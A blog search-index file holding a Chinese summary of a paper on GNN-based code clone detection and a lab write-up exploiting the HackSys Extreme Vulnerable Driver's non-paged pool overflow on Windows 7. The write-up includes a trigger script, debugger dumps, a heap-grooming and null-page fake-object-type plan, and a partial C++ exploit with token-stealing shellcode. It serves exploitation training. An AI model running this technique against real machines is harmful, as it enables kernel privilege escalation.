<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Detecting Code Clones with Graph Neural Network and Flow-Augmented Abstract Syntax Tree(SANER 2020)</title>
    <url>/c3516a94.html</url>
    <content><![CDATA[<h2><span id="pji-ben-jie-shao">基本介绍</span><a href="#pji-ben-jie-shao" class="header-anchor">#</a></h2><p>是一篇源代码和源代码相似性检测的论文，采用FA-AST构造图，然后使用图神经网络进行相似度计算</p><a id="more"></a><p>目前克隆检测主要分为这4种</p><ul><li>Type1：完全克隆，无修改</li><li>Type2：重命名克隆，例如类型名，函数名，变量名等</li><li>Type3：简单的增删等</li><li>Type4：语义克隆</li></ul><p>本文是一篇语义克隆检测的研究，实验对象为Java语言，但从方法上看，没有依赖于Java语言，感觉其他语言也可行，代码开源在<a href="https://github.com/jacobwwh/graphmatch_clone">github</a></p><p>贡献：</p><ol><li>据我们所知，我们是第一个将图神经网络应用于代码克隆检测的研究， 我们采用两种不同类型的图神经网络并分析其性能之间的差异(但我感觉不是？)</li><li>提出了一种新的代码表示方式FA-AST，利用了控制流和数据流信息，基于AST构建</li><li>在测试集上表现优秀</li></ol><h2><span id="ptu-shen-jing-wang-luo-jie-shao">图神经网络介绍</span><a href="#ptu-shen-jing-wang-luo-jie-shao" class="header-anchor">#</a></h2><p>对于图片来说，其实只有Pixel信息和全图/局部信息的区别。但是对于一张图(结构意义的图)来说，主要由节点信息(Node)、边信息(Edge)，为了处理图，图神经网络就应运而生了，目的是将节点信息和边信息编码到最终的输出中，大部分图神经网络都可以用MPNN框架概括</p><p>MPNN：message passing neural networks</p><p>图：G(V,E)，V是节点集合，E是边集合，每个节点包含隐藏状态h，每个边都有特征e</p><p>单个节点间信息传递(j -&gt; i)：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210510164319716.png" alt="image-20210510164319716"></p><p>i获得的信息：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210510164411419.png" alt="image-20210510164411419"></p><p>更新隐藏状态：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210510164435317.png" alt="image-20210510164435317"></p><p>图编码结果（特征向量）：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210510164507615.png" alt="image-20210510164507615"></p><p>示例图如下：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512143328774.png" alt="image-20210512143328774"></p><h2><span id="pfang-fa-jie-shao">方法介绍</span><a href="#pfang-fa-jie-shao" class="header-anchor">#</a></h2><h3><span id="pwen-ti-ding-yi">问题定义</span><a href="#pwen-ti-ding-yi" class="header-anchor">#</a></h3><p>对于两个代码片段$C_i$和$C_j$，设置标签$y_{ij}$表示两者是否为克隆对</p><p>训练集：$D={(C_i,C_j,y_{ij})}$</p><p>训练一个模型，根据片段$C_i$和$C_j$生成相似性分数$s_{ij}$，相似性分数反应两者是否为克隆对</p><h3><span id="pzheng-ti-kuang-jia">整体框架</span><a href="#pzheng-ti-kuang-jia" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512143925461.png" alt="image-20210512143925461"></p><p>对于代码片段，先生成对应的AST，然后在AST的基础上加入边，构成图，最后使用图神经网络进行训练和检测，训练的Loss选择的是MSE(mean squared error)</p><h3><span id="pfa-ast-gou-zao">FA-AST构造</span><a href="#pfa-ast-gou-zao" class="header-anchor">#</a></h3><h4><span id="pwei-shi-me-xuan-ast">为什么选AST</span><a href="#pwei-shi-me-xuan-ast" class="header-anchor">#</a></h4><p><strong>疑问</strong>： 为什么不使用Control Flow + 数据流而选择 AST + 数据流</p><p><strong>理由</strong>：</p><ol><li>控制流图的边没有抽象语法树多，对于图神经网络来说，更少的边意味着两个节点间的信息更少</li><li>在控制流图里大部分节点是语句，而不是token，如果对这些节点使用简单的算法比如Bag of words，会损失语义信息，另一个合理的方法是为每个语句构造子图，但是会耗费更多的计算资源</li></ol><h4><span id="pzong-ti-she-ji">总体设计</span><a href="#pzong-ti-she-ji" class="header-anchor">#</a></h4><p>AST生成实现：使用python包javalang对java代码生成语法树</p><p>边类型：</p><ul><li>Parent:连接非终结节点到父节点</li><li>Child：连接非终结节点到子节点</li><li>NextSib：连接节点和它的相邻节点</li><li>NextToken：连接终结符和终结符，体现next关系</li><li>NextUse：连接当前使用和下次使用的节点</li></ul><p>除了这些类型外，还为sequential execution, If statements, While and For loops这些类型加入了控制边</p><h4><span id="pif-yu-ju">If语句</span><a href="#pif-yu-ju" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512145320548.png" alt="image-20210512145320548"></p><h4><span id="pwhile-yu-ju">While语句</span><a href="#pwhile-yu-ju" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512145336749.png" alt="image-20210512145336749"></p><h4><span id="pfor-yu-ju">For语句</span><a href="#pfor-yu-ju" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512145347791.png" alt="image-20210512145347791"></p><h4><span id="pblock-dai-ma-kuai">Block代码块</span><a href="#pblock-dai-ma-kuai" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512145413689.png" alt="image-20210512145413689"></p><h3><span id="ptu-shen-jing-wang-luo">图神经网络</span><a href="#ptu-shen-jing-wang-luo" class="header-anchor">#</a></h3><p>两种方法：</p><ol><li>使用GGNN计算Graph Embedding，然后计算相似度</li><li>直接使用GMN计算图相似度</li></ol><p>在看的时候发现图神经网络这部分和一篇PRML 2019的思路不能说一模一样，只能说毫不相干（手动狗头），不过确实论文里写了参考的这个，<a href="https://arxiv.org/pdf/1904.12787.pdf">Graph Matching Networks for Learning the Similarity of Graph Structured Objects</a>。</p><h4><span id="pggnn">GGNN</span><a href="#pggnn" class="header-anchor">#</a></h4><p>具体可参考：<a href="https://zhuanlan.zhihu.com/p/83410937">https://zhuanlan.zhihu.com/p/83410937</a></p><p>好处是当存在大量数据时，只需要对Embedding后的数据进行相似度计算即可</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512150122937.png" alt="image-20210512150122937"></p><h4><span id="pgmn">GMN</span><a href="#pgmn" class="header-anchor">#</a></h4><p>相对于GGNN，GMN能直接比较两个图，好处是可以重点比较图中的各个节点，牺牲计算复杂度获得精确度</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512152615230.png" alt="image-20210512152615230"></p><p>关键在于$u_{j\longrightarrow i}$，目的是去寻找两个图中的相似节点</p><h2><span id="pshi-yan">实验</span><a href="#pshi-yan" class="header-anchor">#</a></h2><h3><span id="pshu-ju-ji-xin-xi">数据集信息</span><a href="#pshu-ju-ji-xin-xi" class="header-anchor">#</a></h3><p>数据集：Google Code Jam (GCJ) and BigCloneBench</p><ul><li>Google Code Jam：是google举办的编程比赛，采用的数据包含1669个java文件和12个编程问题</li><li>BigCloneBench ：是一个代码克隆大型数据集，包含6000000个克隆对和260000个非克隆对</li></ul><p>由于三型和四型界限问题，根据语句粒度的相似性划分如下：</p><ul><li>strongly type-3 (ST3)：[0.7, 1.0),</li><li>moderately type-3 (MT3) : [0.5, 0.7)</li><li>weakly type-3/type-4 (WT3/T4) : [0.0, 0.5)</li></ul><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512153454043.png" alt="image-20210512153454043"></p><p>数据集基本信息：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512153513202.png" alt="image-20210512153513202"></p><p>两个数据集中的控制信息：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512153552038.png" alt="image-20210512153552038"></p><h3><span id="pshi-yan-she-zhi">实验设置</span><a href="#pshi-yan-she-zhi" class="header-anchor">#</a></h3><p>和下列方法比较：</p><p>DECKARD：基于AST树的克隆检测，为每个子树生成vector，然后使用聚类算法检测克隆</p><p>RtvNN：RNN为token计算embedding，然后为AST计算embedding，计算相似性</p><p>CDLH：binary Tree-LSTM计算AST的embedding，计算相似性</p><p>ASTNN：RNN编码AST，然后计算相似性</p><p>数据集划分为8:1:1</p><h3><span id="pshi-yan-jie-guo">实验结果</span><a href="#pshi-yan-jie-guo" class="header-anchor">#</a></h3><h4><span id="pzai-liang-ge-shu-ju-ji-shang-de-biao-xian">在两个数据集上的表现</span><a href="#pzai-liang-ge-shu-ju-ji-shang-de-biao-xian" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512154713613.png" alt="image-20210512154713613"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512154737486.png" alt="image-20210512154737486"></p><h4><span id="pjian-ce-type3-4-ke-long-de-neng-li">检测Type3/4克隆的能力</span><a href="#pjian-ce-type3-4-ke-long-de-neng-li" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512155047165.png" alt="image-20210512155047165"></p><h2><span id="ptao-lun">讨论</span><a href="#ptao-lun" class="header-anchor">#</a></h2><p><strong>论文方法的优势</strong>：</p><ol><li>综合了AST,CFG,DFG信息，而之前的方法没有那么全</li><li>将代码片段转换为图，作为信息输入，而之前的方法没有保留那么多的结构信息</li><li>检测到了一些ASTNN检测不到的克隆例子</li></ol><p>示例1：ASTNN检测相似性为5.8e-7，FA-AST 0.94，功能上都是做了一个拷贝</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512155902221.png" alt="image-20210512155902221"></p><p>示例2：ASTNN 相似性为0.94，FA-AST相似性为-0.27。a是文件解压，b是拷贝</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-12-05-image-20210512155853966.png" alt="image-20210512155853966"></p><h2><span id="pcan-kao-wen-xian">参考文献</span><a href="#pcan-kao-wen-xian" class="header-anchor">#</a></h2><ul><li><a href="https://zhuanlan.zhihu.com/p/83410937">图网络学习算法之——GGNN (Gated Graph Neural Network)</a></li><li><a href="https://arxiv.org/pdf/1904.12787.pdf">Graph Matching Networks for Learning the Similarity of Graph Structured Objects</a></li></ul>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>HEVD BufferOverflowNonPagedPool [win7sp1]</title>
    <url>/806e98fe.html</url>
    <content><![CDATA[<blockquote><p>HEVD系列第三类漏洞BufferOverflowNonPagedPool</p></blockquote><a id="more"></a><h2><span id="plou-dong-fen-xi">漏洞分析</span><a href="#plou-dong-fen-xi" class="header-anchor">#</a></h2><h3><span id="plou-dong-dian">漏洞点</span><a href="#plou-dong-dian" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-06-05-upload_dcf4944314a17a2f4847692c6f21eefe.png" alt="img"></p><p>可以看到问题在于使用RtlCopyMemory函数将用户buffer内容拷贝到内核中时，使用的buffer长度为用户buffer的长度而不是内核buffer的长度，因此当用户buffer长度过长时，出现了非分页池溢出。</p><h3><span id="pfei-fen-ye-chi">非分页池</span><a href="#pfei-fen-ye-chi" class="header-anchor">#</a></h3><p>当我们在windows下创建一些对象时，系统会从非分页池中分配区域来保存该对象。除了该对象外，还会分配一个内存头来存储系统管理这块内存需要的信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import ctypes, sys, struct</span><br><span class="line">from ctypes import *</span><br><span class="line">from subprocess import *</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    kernel32 &#x3D; windll.kernel32</span><br><span class="line">    ntdll &#x3D; windll.ntdll</span><br><span class="line"></span><br><span class="line">    hevDevice &#x3D; kernel32.CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;, 0xC0000000, 0, None, 0x3, 0, None)</span><br><span class="line"></span><br><span class="line">    if not hevDevice or hevDevice &#x3D;&#x3D; -1:</span><br><span class="line">        print &quot;*** Couldn&#39;t get Device Driver handle.&quot;</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    buf &#x3D; &quot;A&quot; * 504</span><br><span class="line">    buf_ad &#x3D; id(buf) + 20</span><br><span class="line"></span><br><span class="line">    spray_event1 &#x3D; []</span><br><span class="line"></span><br><span class="line">    for i in xrange(20):</span><br><span class="line">        spray_event1.append(kernel32.CreateEventA(None, False, False, None))</span><br><span class="line">    events &#x3D; [hex(event) for event in spray_event1]</span><br><span class="line">    print(events)</span><br><span class="line">    kernel32.DeviceIoControl(hevDevice, 0x22200f, buf_ad, len(buf), None, 0, byref(c_ulong()), None)</span><br><span class="line">    input(&quot;pause&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; !process 0 0 python.exe</span><br><span class="line">PROCESS 876acb30  SessionId: 1  Cid: 05ec    Peb: 7ffde000  ParentCid: 0bfc</span><br><span class="line">    DirBase: 3e88a460  ObjectTable: e11785c8  HandleCount:  64.</span><br><span class="line">    Image: python.exe</span><br><span class="line">kd&gt; .process 876acb30</span><br><span class="line">Implicit process is now 876acb30</span><br><span class="line">WARNING: .cache forcedecodeuser is not enabled</span><br><span class="line">kd&gt; !handle 0xa4</span><br><span class="line"></span><br><span class="line">PROCESS 876acb30  SessionId: 1  Cid: 05ec    Peb: 7ffde000  ParentCid: 0bfc</span><br><span class="line">    DirBase: 3e88a460  ObjectTable: e11785c8  HandleCount:  64.</span><br><span class="line">    Image: python.exe</span><br><span class="line"></span><br><span class="line">Handle table at e11785c8 with 64 entries in use</span><br><span class="line"></span><br><span class="line">00a4: Object: 8772cd38  GrantedAccess: 001f0003 Entry: a2332148</span><br><span class="line">Object: 8772cd38  Type: (85613bc0) Event</span><br><span class="line">    ObjectHeader: 8772cd20 (new version)</span><br><span class="line">        HandleCount: 1  PointerCount: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; !pool  8772cd38</span><br><span class="line">Pool page 8772cd38 region is Nonpaged pool</span><br><span class="line"> 8772c000 size:  1a0 previous size:    0  (Allocated)  TdxC</span><br><span class="line"> 8772c1a0 size:    8 previous size:  1a0  (Free)       NSpg</span><br><span class="line"> 8772c1a8 size:   58 previous size:    8  (Allocated)  IPsi</span><br><span class="line"> 8772c200 size:    8 previous size:   58  (Free)       NSpg</span><br><span class="line"> 8772c208 size:   48 previous size:    8  (Allocated)  Vad </span><br><span class="line"> 8772c250 size:   48 previous size:   48  (Allocated)  Vad </span><br><span class="line"> 8772c298 size:   78 previous size:   48  (Allocated)  WfpL</span><br><span class="line"> 8772c310 size:   10 previous size:   78  (Free)       usbp</span><br><span class="line"> 8772c320 size:  2e8 previous size:   10  (Allocated)  Thre (Protected)</span><br><span class="line"> 8772c608 size:    8 previous size:  2e8  (Free)       CcSc</span><br><span class="line"> 8772c610 size:   48 previous size:    8  (Allocated)  Vad </span><br><span class="line"> 8772c658 size:   10 previous size:   48  (Free)       Even</span><br><span class="line"> 8772c668 size:   48 previous size:   10  (Allocated)  Vad </span><br><span class="line"> 8772c6b0 size:   40 previous size:   48  (Allocated)  Even (Protected)</span><br><span class="line"> 8772c6f0 size:   48 previous size:   40  (Allocated)  Vad </span><br><span class="line"> 8772c738 size:   f8 previous size:   48  (Allocated)  MmCi</span><br><span class="line"> 8772c830 size:   18 previous size:   f8  (Free)       CcWk</span><br><span class="line"> 8772c848 size:   40 previous size:   18  (Allocated)  Even (Protected)</span><br><span class="line"> 8772c888 size:  118 previous size:   40  (Allocated)  MmCi</span><br><span class="line"> 8772c9a0 size:   c8 previous size:  118  (Allocated)  Ntfx</span><br><span class="line"> 8772ca68 size:   48 previous size:   c8  (Allocated)  Vad </span><br><span class="line"> 8772cab0 size:   48 previous size:   48  (Allocated)  Vad </span><br><span class="line"> 8772caf8 size:   78 previous size:   48  (Allocated)  MmCa</span><br><span class="line"> 8772cb70 size:   40 previous size:   78  (Allocated)  Even (Protected)</span><br><span class="line"> 8772cbb0 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 8772cbf0 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 8772cc30 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 8772cc70 size:   18 previous size:   40  (Free)       CcWk</span><br><span class="line"> 8772cc88 size:   40 previous size:   18  (Allocated)  Even (Protected)</span><br><span class="line"> 8772ccc8 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line">*8772cd08 size:   40 previous size:   40  (Allocated) *Even (Protected)</span><br><span class="line">		Pooltag Even : Event objects</span><br><span class="line"> 8772cd48 size:   90 previous size:   40  (Allocated)  MmCa</span><br><span class="line"> 8772cdd8 size:   68 previous size:   90  (Allocated)  EtwR (Protected)</span><br><span class="line"> 8772ce40 size:   68 previous size:   68  (Allocated)  EtwR (Protected)</span><br><span class="line"> 8772cea8 size:   68 previous size:   68  (Allocated)  EtwR (Protected)</span><br><span class="line"> 8772cf10 size:   68 previous size:   68  (Allocated)  EtwR (Protected)</span><br><span class="line"> 8772cf78 size:   20 previous size:   68  (Allocated)  ReTa</span><br><span class="line"> 8772cf98 size:   68 previous size:   20  (Allocated)  FMsl</span><br></pre></td></tr></table></figure><p>可以看到分配的Event对象都在非分页池中，大小为0x40</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; dd 8772cd08</span><br><span class="line">8772cd08  04080008 ee657645 00000000 00000040</span><br><span class="line">8772cd18  00000000 00000000 00000001 00000001</span><br><span class="line">8772cd28  00000000 0008000c 87420a80 00000000</span><br><span class="line">8772cd38  00040001 00000000 8772cd40 8772cd40</span><br><span class="line">kd&gt; dt nt!_POOL_HEADER 8772cd08</span><br><span class="line">   +0x000 PreviousSize     : 0y000001000 (0x8)</span><br><span class="line">   +0x000 PoolIndex        : 0y0000000 (0)</span><br><span class="line">   +0x002 BlockSize        : 0y000001000 (0x8)</span><br><span class="line">   +0x002 PoolType         : 0y0000010 (0x2)</span><br><span class="line">   +0x000 Ulong1           : 0x4080008</span><br><span class="line">   +0x004 PoolTag          : 0xee657645</span><br><span class="line">   +0x004 AllocatorBackTraceIndex : 0x7645</span><br><span class="line">   +0x006 PoolTagHash      : 0xee65</span><br><span class="line">kd&gt; dt nt!_OBJECT_HEADER_QUOTA_INFO 8772cd08+8</span><br><span class="line">   +0x000 PagedPoolCharge  : 0</span><br><span class="line">   +0x004 NonPagedPoolCharge : 0x40</span><br><span class="line">   +0x008 SecurityDescriptorCharge : 0</span><br><span class="line">   +0x00c SecurityDescriptorQuotaBlock : (null) </span><br><span class="line">kd&gt; dt nt!_OBJECT_HEADER 8772cd08+8+0x10</span><br><span class="line">   +0x000 PointerCount     : 0n1</span><br><span class="line">   +0x004 HandleCount      : 0n1</span><br><span class="line">   +0x004 NextToFree       : 0x00000001 Void</span><br><span class="line">   +0x008 Lock             : _EX_PUSH_LOCK</span><br><span class="line">   +0x00c TypeIndex        : 0xc &#39;&#39;</span><br><span class="line">   +0x00d TraceFlags       : 0 &#39;&#39;</span><br><span class="line">   +0x00e InfoMask         : 0x8 &#39;&#39;</span><br><span class="line">   +0x00f Flags            : 0 &#39;&#39;</span><br><span class="line">   +0x010 ObjectCreateInfo : 0x87420a80 _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +0x010 QuotaBlockCharged : 0x87420a80 Void</span><br><span class="line">   +0x014 SecurityDescriptor : (null) </span><br><span class="line">   +0x018 Body             : _QUAD</span><br></pre></td></tr></table></figure><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-06-05-upload_a87b53aa5e5cd9a64ec6ed8c777654a7.png" alt="img"></p><ul><li>红色：pool header</li><li>黄色：object header quota info</li><li>蓝色：object header</li><li>绿色：object body</li></ul><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-06-05-upload_c8acad4d12721247fde43b9362e0dc60.png" alt="img"></p><p>在对象的头里面，还存着TypeIndex和InfoMask信息。TypeIndex代表该对象的object type在ObTypeIndexTable中的偏移</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; dd nt!obtypeindextable</span><br><span class="line">83f81900  00000000 bad0b0b0 855338c8 85533800</span><br><span class="line">83f81910  85533738 855334f0 855f8040 855f8f78</span><br><span class="line">83f81920  855f8eb0 855f8de8 855f8d20 855f8668</span><br><span class="line">83f81930  85613bc0 85613840 85613440 8560c418</span><br><span class="line">83f81940  8560c350 8560d418 8560d350 8561b430</span><br><span class="line">83f81950  8561b368 8560e9b8 8560e8f0 8560e828</span><br><span class="line">83f81960  8560e760 8560e698 8560e5d0 8560e508</span><br><span class="line">83f81970  8560e440 85610f78 85610eb0 85610de8</span><br><span class="line">kd&gt; dt nt!_object_type 85613bc0</span><br><span class="line">   +0x000 TypeList         : _LIST_ENTRY [ 0x85613bc0 - 0x85613bc0 ]</span><br><span class="line">   +0x008 Name             : _UNICODE_STRING &quot;Event&quot;</span><br><span class="line">   +0x010 DefaultObject    : (null) </span><br><span class="line">   +0x014 Index            : 0xc &#39;&#39;</span><br><span class="line">   +0x018 TotalNumberOfObjects : 0xea9</span><br><span class="line">   +0x01c TotalNumberOfHandles : 0xefa</span><br><span class="line">   +0x020 HighWaterNumberOfObjects : 0x109c</span><br><span class="line">   +0x024 HighWaterNumberOfHandles : 0x1115</span><br><span class="line">   +0x028 TypeInfo         : _OBJECT_TYPE_INITIALIZER</span><br><span class="line">   +0x078 TypeLock         : _EX_PUSH_LOCK</span><br><span class="line">   +0x07c Key              : 0x6e657645</span><br><span class="line">   +0x080 CallbackList     : _LIST_ENTRY [ 0x85613c40 - 0x85613c40 ]</span><br><span class="line">kd&gt; dx -id 0,0,876acb30 -r1 (*((ntkrpamp!_OBJECT_TYPE_INITIALIZER *)0x85613be8))</span><br><span class="line">(*((ntkrpamp!_OBJECT_TYPE_INITIALIZER *)0x85613be8))                 [Type: _OBJECT_TYPE_INITIALIZER]</span><br><span class="line">    [+0x000] Length           : 0x50 [Type: unsigned short]</span><br><span class="line">    [+0x002] ObjectTypeFlags  : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 0: 0)] CaseInsensitive  : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 1: 1)] UnnamedObjectsOnly : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 2: 2)] UseDefaultObject : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 3: 3)] SecurityRequired : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 4: 4)] MaintainHandleCount : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 5: 5)] MaintainTypeList : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 6: 6)] SupportsObjectCallbacks : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x004] ObjectTypeCode   : 0x2 [Type: unsigned long]</span><br><span class="line">    [+0x008] InvalidAttributes : 0x100 [Type: unsigned long]</span><br><span class="line">    [+0x00c] GenericMapping   [Type: _GENERIC_MAPPING]</span><br><span class="line">    [+0x01c] ValidAccessMask  : 0x1f0003 [Type: unsigned long]</span><br><span class="line">    [+0x020] RetainAccess     : 0x0 [Type: unsigned long]</span><br><span class="line">    [+0x024] PoolType         : NonPagedPool (0) [Type: _POOL_TYPE]</span><br><span class="line">    [+0x028] DefaultPagedPoolCharge : 0x0 [Type: unsigned long]</span><br><span class="line">    [+0x02c] DefaultNonPagedPoolCharge : 0x40 [Type: unsigned long]</span><br><span class="line">    [+0x030] DumpProcedure    : 0x0 [Type: void (*)(void *,_OBJECT_DUMP_CONTROL *)]</span><br><span class="line">    [+0x034] OpenProcedure    : 0x0 [Type: long (*)(_OB_OPEN_REASON,char,_EPROCESS *,void *,unsigned long *,unsigned long)]</span><br><span class="line">    [+0x038] CloseProcedure   : 0x0 [Type: void (*)(_EPROCESS *,void *,unsigned long,unsigned long)]</span><br><span class="line">    [+0x03c] DeleteProcedure  : 0x0 [Type: void (*)(void *)]</span><br><span class="line">    [+0x040] ParseProcedure   : 0x0 [Type: long (*)(void *,void *,_ACCESS_STATE *,char,unsigned long,_UNICODE_STRING *,_UNICODE_STRING *,void *,_SECURITY_QUALITY_OF_SERVICE *,void * *)]</span><br><span class="line">    [+0x044] SecurityProcedure : 0x840a35b6 [Type: long (*)(void *,_SECURITY_OPERATION_CODE,unsigned long *,void *,unsigned long *,void * *,_POOL_TYPE,_GENERIC_MAPPING *,char)]</span><br><span class="line">    [+0x048] QueryNameProcedure : 0x0 [Type: long (*)(void *,unsigned char,_OBJECT_NAME_INFORMATION *,unsigned long,unsigned long *,char)]</span><br><span class="line">    [+0x04c] OkayToCloseProcedure : 0x0 [Type: unsigned char (*)(_EPROCESS *,void *,void *,char)]</span><br></pre></td></tr></table></figure><p>通过偏移就可以看到Event对象类型的结构信息了，其中<code>CloseProcedure</code>是我们后面需要用到的一个回调函数</p><h2><span id="plou-dong-li-yong">漏洞利用</span><a href="#plou-dong-li-yong" class="header-anchor">#</a></h2><p>我们的kernel buffer存在于非分页池中，大小为0x200(0xf8用户可使用大小+0x8 pool header)。</p><ol><li>通过堆风水，使得Event对象正好在kernel buffer的后方，确保Event对象可以被溢出覆盖</li><li>覆盖 kernel buffer 后紧跟的 Event 对象的 object header 中的 TypeIndex 的值为 0x00。</li><li>ObTypeIndexTable[0]的值为0x00000000。0x0地址理论上是一个不可读写的地址，用于预防程序员对NULL进行操作。0x0-0xFFFF是空闲区域。在用户模式下，可以通过 NtAllocateVirtualMemory 来分配这个空间，用 WriteProcessMemory 来覆盖这段地址的内存空间。</li><li>我们可以在0地址处伪造一个objectType,使得该对象类型的CloseProcedure指向shellcode</li><li>调用CloseHandle执行shellcode</li></ol><h3><span id="pdui-feng-shui">堆风水</span><a href="#pdui-feng-shui" class="header-anchor">#</a></h3><p>一个Event的大小是0x40，而kernel buffer的大小是0x200，也就是等于8个Event的大小。</p><ol><li>不断分配小内存，占满零碎空间，使得0x200无法放入其中，此时可以认为剩下的空间时连续的一块大空间</li><li>分配Event，占满所有空间，此时Event应该都是连续的内存</li><li>从这些Event中，假设16个为一组，释放每组的前8个Event，空出0x200的空间</li><li>触发HEVD，分配0x200的kernel buffer，此时必然有一组中的0x200被占用，且后面紧跟一个Event</li></ol><h3><span id="pkong-zhi-liu-jie-chi">控制流劫持</span><a href="#pkong-zhi-liu-jie-chi" class="header-anchor">#</a></h3><p>覆盖 TypeIndex为0，在0x0-0xFFFF中将伪造类型的CloseProcedure地址填为shellcode地址<br>释放所有Event，必然有一个Event在Close的时候会执行我们布置的shellcode，注意这里的CloseProcedure地址其实就是0x60，因为TypeInfo在<code>nt!_object_type</code>中偏移为0x28，而CloseProcedure在TypeInfo中的偏移为0x38，所以CloseProcedure地址为0x60</p><h2><span id="pc-exp-vs2017">C++ exp (VS2017)</span><a href="#pc-exp-vs2017" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">typedef NTSTATUS(WINAPI * NtAllocateVirtualMemory_t) (HANDLE    ProcessHandle,</span><br><span class="line">	PVOID     *BaseAddress,</span><br><span class="line">	ULONG_PTR ZeroBits,</span><br><span class="line">	PSIZE_T   RegionSize,</span><br><span class="line">	ULONG     AllocationType,</span><br><span class="line">	ULONG     Protect);</span><br><span class="line"></span><br><span class="line">char shellcode[] &#x3D; &#123;</span><br><span class="line"></span><br><span class="line">	&quot;\x90\x90\x90\x90&quot;              &#x2F;&#x2F; NOP Sled</span><br><span class="line">	&quot;\x60&quot;                          &#x2F;&#x2F; pushad</span><br><span class="line">	&quot;\x31\xc0&quot;                      &#x2F;&#x2F; xor eax,eax</span><br><span class="line">	&quot;\x64\x8b\x80\x24\x01\x00\x00&quot;  &#x2F;&#x2F; mov eax,[fs:eax+0x124]</span><br><span class="line">	&quot;\x8b\x40\x50&quot;                  &#x2F;&#x2F; mov eax,[eax+0x50]</span><br><span class="line">	&quot;\x89\xc1&quot;                      &#x2F;&#x2F; mov ecx,eax</span><br><span class="line">	&quot;\xba\x04\x00\x00\x00&quot;          &#x2F;&#x2F; mov edx,0x4</span><br><span class="line">	&quot;\x8b\x80\xb8\x00\x00\x00&quot;      &#x2F;&#x2F; mov eax,[eax+0xb8]</span><br><span class="line">	&quot;\x2d\xb8\x00\x00\x00&quot;          &#x2F;&#x2F; sub eax,0xb8</span><br><span class="line">	&quot;\x39\x90\xb4\x00\x00\x00&quot;      &#x2F;&#x2F; cmp [eax+0xb4],edx</span><br><span class="line">	&quot;\x75\xed&quot;                      &#x2F;&#x2F; jnz 0x1a</span><br><span class="line">	&quot;\x8b\x90\xf8\x00\x00\x00&quot;      &#x2F;&#x2F; mov edx,[eax+0xf8]</span><br><span class="line">	